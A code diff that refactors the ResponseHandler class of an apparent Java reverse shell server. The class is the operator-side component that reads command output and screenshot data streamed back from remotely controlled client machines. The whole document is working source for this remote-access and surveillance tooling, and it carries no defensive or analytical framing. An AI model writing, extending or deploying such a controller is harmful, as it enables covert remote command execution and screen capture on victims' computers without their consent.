@@ -1,58 +1,49 @@
 package obs1d1anc1ph3r.reverseshell.server;
 
-import java.io.*;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.IOException;
 import java.net.Socket;
 
 public class ResponseHandler implements Runnable {
 
-    private BufferedReader in;
-    private PrintWriter out;
-    private Socket clientSocket;
-    private ReceiveScreenShot screenshotHandler;
+    private final DataInputStream dataIn;
+    private final DataOutputStream dataOut;
+    private final Socket clientSocket;
+    private final ReceiveScreenShot screenshotHandler;
 
-    public ResponseHandler(BufferedReader in, PrintWriter out, Socket clientSocket) {
-        this.in = in;
-        this.out = out;
+    public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket) {
+        this.dataIn = dataIn;
+        this.dataOut = dataOut;
         this.clientSocket = clientSocket;
         this.screenshotHandler = new ReceiveScreenShot();
     }
 
     @Override
     public void run() {
-        try (DataInputStream dataIn = new DataInputStream(clientSocket.getInputStream())) {
-            String response;
+        try {
             while (true) {
-                response = in.readLine();
-                if (response == null) {
+                String response = dataIn.readUTF();
+                if (response == null || response.isEmpty()) {
                     System.out.println("[DEBUG] Connection closed, exiting...");
                     break;
                 }
 
-                System.out.println("[DEBUG] Response received: " + response);
-                if (response.equalsIgnoreCase("End")) {
-                    System.out.print("[-] Command> ");
-                } else if (response.equalsIgnoreCase("screenshot")) {
-                    System.out.println("[-] Screenshot confirmation received. Preparing to receive screenshot...");
-                    screenshotHandler.receiveScreenshot(clientSocket);
-                } else {
-                    System.out.println("[*] Response received: " + response);
-                }
-
-                if (dataIn.available() > 0) {
-                    System.out.println("[DEBUG] Binary data available...");
+                if (response.equalsIgnoreCase("screenshot")) {
                     int length = dataIn.readInt();
-                    byte[] imageBytes = new byte[length];
-                    dataIn.readFully(imageBytes);
-
-                    System.out.println("[-] Received screenshot data of size: " + imageBytes.length + " bytes.");
-                    screenshotHandler.receiveScreenshot(imageBytes);
-                }
-
-                try {
-                    Thread.sleep(50); 
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                    break;
+                    if (length > 0) {
+                        byte[] imageBytes = new byte[length];
+                        dataIn.readFully(imageBytes);
+                        screenshotHandler.receiveScreenshotData(imageBytes);
+                    } else {
+                        System.err.println("[ERROR] Invalid screenshot data length: " + length);
+                    }
+                } else {
+                    String[] lines = response.split("\\R");
+                    for (String line : lines) {
+                        System.out.println(line);
+                    }
+                    System.out.print("[-] Command> ");
                 }
             }
         } catch (IOException e) {
@@ -69,11 +60,11 @@ public class ResponseHandler implements Runnable {
 
     private void closeResources() {
         try {
-            if (in != null) {
-                in.close();
+            if (dataIn != null) {
+                dataIn.close();
             }
-            if (out != null) {
-                out.close();
+            if (dataOut != null) {
+                dataOut.close();
             }
             if (clientSocket != null && !clientSocket.isClosed()) {
                 clientSocket.close();
